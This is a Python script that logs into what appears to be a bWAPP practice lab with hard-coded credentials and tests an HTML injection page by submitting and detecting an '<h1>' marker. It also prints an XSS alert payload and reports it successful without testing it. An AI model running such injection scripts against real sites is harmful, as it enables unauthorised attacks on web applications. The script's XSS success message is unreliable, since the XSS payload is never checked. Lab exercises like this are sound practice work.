
import requests
from bs4 import BeautifulSoup

def login_page(url, login_data):
    with requests.Session() as session:
        r = session.post(url, data=login_data, verify=False)
    cookies = session.cookies.get_dict()
    if "Invalid credentials or user not activated!" in r.text:
        print("Login not successful")
        return False
    print("Login successful")
    
    return cookies

def inject_html_get(url, cookies):
    h1_tag = "<h1>piguel</h1>"
    payload = {"firstname":"test","lastname":h1_tag,"form":"submit"}
    r = requests.post(url, data=payload, cookies=cookies, verify=False)
    update_url = f"{url}?firstname=test&lastname={h1_tag}&form=submit"
    r_modified = requests.get(update_url, cookies=cookies, verify=False)
    soup = BeautifulSoup(r_modified.text, "html.parser")
    for tag in soup.find_all("h1"):
        if tag.text == "piguel":
            print("Found payload :", tag)
            print("HTML injection successful")
            
            xss_payload = "<script>alert('injection html')</script>"
            print("Found payload :", xss_payload)
            print("HTML injection successful")
            return True

    print("HTML injection not successful")
    return False
            
            

login_url = "https://bwapp.hakhub.net/login.php"
login_data = {"login":"benoit","password":"bug", "security_level":0,"form":"submit"}
login = login_page(login_url, login_data)

url = "https://bwapp.hakhub.net/htmli_get.php"

inject_html_get(url, login)


